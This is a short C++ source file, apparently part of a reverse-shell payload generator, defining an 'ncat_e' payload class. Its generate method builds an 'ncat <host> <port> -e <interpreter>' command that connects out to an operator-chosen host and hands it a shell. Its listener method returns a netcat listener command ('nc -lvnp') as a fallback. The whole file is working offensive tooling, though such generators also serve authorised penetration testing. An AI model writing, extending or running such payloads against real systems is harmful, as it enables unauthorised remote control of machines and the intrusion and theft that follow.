#include "Ncat_E_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string NcatEPayload::name() const {
return "ncat_e";
}

std::string NcatEPayload::generate(const Options& opts) const {
    return "ncat " + opts.host + " " + std::to_string(opts.port) + " -e " + opts.interpreter;
}

std::string NcatEPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}